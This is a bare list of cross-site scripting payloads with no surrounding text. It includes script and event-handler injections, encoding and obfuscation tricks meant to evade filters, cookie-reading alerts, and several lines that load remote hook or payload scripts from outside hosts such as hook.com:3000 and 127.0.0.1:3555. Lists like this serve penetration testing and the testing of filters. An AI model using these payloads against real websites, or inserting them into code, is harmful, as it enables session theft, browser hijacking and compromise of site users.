...
javascript://http://abc.com/?aaaa%0aalert(document.cookie)
<iframe src="https://www.abc.com" width="100" height="100"></iframe>
<script>alert(window.location)</script>
">"><img src="x" onerror=alert(0)>
data:text/html;base64,PHNjcmlwdD5hbGVydCh3aW5kb3cubG9jYXRpb24pPC9zY3JpcHQ+
/x:1/:///%01javascript:alert(document.cookie)/
<script>alert(window.location+"--"+($("input[name=Update]").attr("onclick")));</script>
...
javascript://http://kook.com:3000/demos/butcher/index.html%0aalert(document.cookie)
"+onclick=co\u006efirm()//
<img src=x onerror=eval(prompt(http://hook.com:3000/hook.js))>
...
<IFRAME SRC='f' onerror='{JAVASCRIPT}'></IFRAME>
12345678-9012-3456-7890-123456789023
‘%uff1cscript%uff1ealert(‘XSS’);%uff1c/script%uff1e’
<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
 >'>"><svg/onload=prompt(">'>"><svg/onload=prompt("XSS-by-faiz")>XSS-by-faiz")> ''">  -alert(1)-  -prompt(1)- 
<marquee/onstart=confirm(1)>
...
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/KCF/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1&#x29;"/alt="/"src="/"onerror=eval(id&#x29;>'"><img src="http://www.mini-safari.com/wp-content/uploads/2014/08/leopard.jpg">
...
<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/KCF/)></script ????????????
...
<meta http-equiv="refresh" content="0; url=data:text/html,alert(1)%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E">
...
<a/onmouseover[\x0b]=location='\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x31\x29\x3B'>KCF
...
#<script>alert(Hacked by Pratik)</script>
...
<<scr\0ipt/src=http://127.0.0.1:3555/xss_serve_payloads/kcf.js></script
...
<iframe src=http://127.0.0.1:3555/xss_serve_payloads/kcf.html <
...
<img src = ”http://127.0.0.1:3555/xss_serve_payloads/kcf.js”>

<img src = ”http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp”>

<A HREF="//127.0.0.1:3555/xss_serve_payloads/kcf.html">KCF</A>
...
perl -e 'print "&lt;IMG SRC=java\0script:alert(\"KCF\")&gt;";' &gt; out

perl -e 'print "&lt;SCR\0IPT&gt;alert(\"KCF\")&lt;/SCR\0IPT&gt;";' &gt; out
...
&lt;A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D"&gt;KCF&lt;/A&gt;

&lt;A HREF="http://1113982867/"&gt;KCF&lt;/A&gt;

&lt;A HREF="http://0x42.0x0000066.0x7.0x93/"&gt;KCF&lt;/A&gt;

&lt;A HREF="http://0102.0146.0007.00000223/"&gt;KCF&lt;/A&gt;

&lt;A HREF="h&#x0A;tt&#09;p://6&amp;#9;6.000146.0x7.147/"&gt;KCF&lt;/A&gt;
...
<A HREF="h tt	p://6&#09;6.000146.0x7.147/">KCF</A>

<A HREF="//google">KCF</A>

<A HREF="http://127.0.0.1:3555/xss_serve_payloads/kcf.html@google">KCF</A

<A HREF="http://google:127.0.0.1:3555/xss_serve_payloads/kcf.html">KCF</A>
...
<SCRIPT SRC=http://127.0.0.1:3555/xss_serve_payloads/kcf.js< B >
...
<SCRIPT SRC="http://127.0.0.1:3555/xss_serve_payloads/kcf.jpg"></SCRIPT>
...
<A HREF="http://127.0.0.1/">KCF</A>

<A HREF="http://0x42.0x0000066.0x7.0x93/">KCF</A>

<A HREF="http://0102.0146.0007.00000223/">KCF</A>

<A HREF="htt	p://6	6.000146.0x7.147/">KCF</A>
...
<svg><script x:href='http://127.0.0.1:3555/xss_serve_payloads/kcf.js'
...
<a href="javascript:\u0031+\u0031\u005b'\145\166\141\154'\u005d\u0028'\141\154\145\162\164\50\61\51'\u0029">kcf</a>
